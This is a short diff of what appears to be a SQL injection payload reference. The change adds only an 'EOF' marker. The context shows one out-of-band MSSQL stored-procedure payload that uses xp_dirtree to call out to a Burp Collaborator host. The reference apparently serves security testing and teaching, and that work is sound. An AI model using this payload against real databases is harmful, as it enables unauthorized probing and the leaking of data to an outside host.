@@ -244,3 +244,5 @@ It relies on a variety of protocols, such as DNS and HTTP.
 ### Example Payload (out-of-band) STORED PROCEDURE
 
 `'; exec master..xp_dirtree '//0efdyfaksnakwjfbvijb3876.burpcollaborator.net/a'--`
+
+**EOF**
